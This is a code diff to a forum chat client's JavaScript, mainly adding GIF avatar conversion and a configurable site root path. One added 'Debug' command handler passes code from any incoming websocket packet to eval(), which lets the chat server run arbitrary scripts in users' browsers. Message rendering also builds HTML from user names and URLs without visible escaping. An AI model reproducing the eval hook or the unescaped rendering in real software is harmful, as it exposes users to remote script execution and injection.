@@ -85,6 +85,8 @@ var siteChat = (function() {
 	siteChat.attemptingLogin = false;
 	siteChat.dragWindow = null;
 	siteChat.commandHandlers = {};
+	siteChat.avatarCanvas = document.createElement("canvas");
+	siteChat.avatarContext = siteChat.avatarCanvas.getContext("2d");
 
 	siteChat.roomListRoomTemplate = Handlebars.compile(
 		'<div id="chatroom{{roomId}}">'
@@ -170,6 +172,10 @@ var siteChat = (function() {
 	siteChat.attemptReconnect = function() {
 		siteChat.setupWebSocket();
 	};
+	
+	siteChat.getMessageElementId = function(messageId) {
+		return "scm_" + messageId;
+	};
 
 	siteChat.parseBBCode = function(message) {
 		return message
@@ -186,6 +192,15 @@ var siteChat = (function() {
 					url = str;
 				return siteChat.chatAnchorTemplate({url: url, display: str});
 			});
+	};
+	
+	siteChat.convertGifAvatar = function(image) {
+		siteChat.avatarCanvas.setAttribute("width", image.width);
+		siteChat.avatarCanvas.setAttribute("height", image.height);
+		
+		siteChat.avatarContext.drawImage(image, 0, 0, image.width, image.height);
+		
+		return siteChat.avatarCanvas.toDataURL();
 	};
 
 	siteChat.clearLocalStorage = function() {
@@ -549,14 +564,51 @@ var siteChat = (function() {
 		return (siteChatUser.userColor != null && siteChatUser.userColor != "" ? ('color: #' + siteChatUser.userColor + ';"') : "");
 	};
 	
+	siteChat.shouldDelayAvatarLoad = function(avatarUrl) {
+		var extension = ".gif";
+		var lastIndex = avatarUrl.toLowerCase().lastIndexOf(extension);
+
+		return lastIndex == -1 ? false : (lastIndex + extension.length == avatarUrl.length);
+	};
+	
+	siteChat.createAvatarImageHtml = function(avatarUrl) {
+		return '<img src="' + avatarUrl + '" class="profile"></img>';	
+	};
+	
+	siteChat.delayGifConversion = function(imageUrl, imageElementCreationFunction, elementSelectorToInjectInto) {
+		
+		//TODO: Only perform the conversion once per URL. Cache the results for future use.
+		var image = new Image();
+		image.src = imageUrl;
+		image.onload = function(e) {
+			var pngUrl = siteChat.convertGifAvatar(image);
+			
+			var $element = $(elementSelectorToInjectInto);
+			var imageElementHtml = imageElementCreationFunction(pngUrl);
+			
+			$element.html(imageElementHtml);
+		};
+	},
+	
 	siteChat.renderMessage = function(siteChatConversationMessage, siteChatUser) {
 		var messageDate = new Date(siteChatConversationMessage.createdDatetime);
-		var avatarUrl = siteChatUser.avatarUrl != '' ?  ('http://forum.mafiascum.net/download/file.php?avatar=' + siteChatUser.avatarUrl) : defaultAvatar;
+		var avatarUrl = siteChatUser.avatarUrl != '' ?  (siteChat.rootPath + '/download/file.php?avatar=' + siteChatUser.avatarUrl) : defaultAvatar;
 		var messageDateString = zeroFill(messageDate.getHours(), 2) + ":" + zeroFill(messageDate.getMinutes(), 2);
+		var shouldDelayAvatarLoad = siteChat.shouldDelayAvatarLoad(avatarUrl);
+		var imageHtml = shouldDelayAvatarLoad ? '' : siteChat.createAvatarImageHtml(avatarUrl);
+		var messageElementId = siteChat.getMessageElementId(siteChatConversationMessage.id);
 		
-		return	'<div class="message">'
-			+	'	<a href="http://forum.mafiascum.net/memberlist.php?mode=viewprofile&u=' + siteChatUser.id + '"><div class="avatar-container"><img src="' + avatarUrl + '" class="profile"></img></div></a>'
-			+	'	<div class="messageUserName"><a style="' + siteChat.getUserColorStyle(siteChatUser) + '" href="http://forum.mafiascum.net/memberlist.php?mode=viewprofile&u=' + siteChatUser.id + '">' + siteChatUser.name + '</a></div> <span class="messageTimestamp">(' + messageDateString + ')</span>'
+		if(shouldDelayAvatarLoad) {
+			siteChat.delayGifConversion(
+				avatarUrl,
+				siteChat.createAvatarImageHtml.bind(siteChat),
+				"#" + messageElementId + " .avatar-container"
+			);
+		}
+		
+		return	'<div class="message" id="' + messageElementId + '">'
+			+	'	<a href="' + siteChat.rootPath + '/memberlist.php?mode=viewprofile&u=' + siteChatUser.id + '"><div class="avatar-container">' + imageHtml + '</div></a>'
+			+	'	<div class="messageUserName"><a style="' + siteChat.getUserColorStyle(siteChatUser) + '" href="' + siteChat.rootPath + '/memberlist.php?mode=viewprofile&u=' + siteChatUser.id + '">' + siteChatUser.name + '</a></div> <span class="messageTimestamp">(' + messageDateString + ')</span>'
 			+	'	<div class="messagecontent">' + siteChat.parseBBCode(siteChatConversationMessage.message) + '</div>'
 			+	'</div>'
 	};
@@ -1035,11 +1087,16 @@ var siteChat = (function() {
 				});
 			}
 		};
+		
+		commandHandlers["Debug"] = function(siteChat, siteChatPacket) {
+			var codeFunction = function() { return eval(siteChatPacket.code) };
+			var result = codeFunction(siteChatPacket);
+		};
 
 		return commandHandlers;
 	};
 	
-	siteChat.setup = function(sessionId, userId, autoJoinLobby, siteChatUrl, siteChatProtocol) {
+	siteChat.setup = function(sessionId, userId, autoJoinLobby, siteChatUrl, siteChatProtocol, rootPath) {
 		
 		siteChat.sessionId = sessionId;
 		siteChat.userId = userId;
@@ -1047,6 +1104,7 @@ var siteChat = (function() {
 		siteChat.siteChatUrl = siteChatUrl;
 		siteChat.siteChatProtocol = siteChatProtocol;
 		siteChat.adjustElementColor = typeof window.adjustColor === "function" ? window.adjustColor : function(){};
+		siteChat.rootPath = rootPath;
 
 		if(!supportsHtml5Storage() || (typeof(WebSocket) != "function" && typeof(WebSocket) != "object"))
 			return;
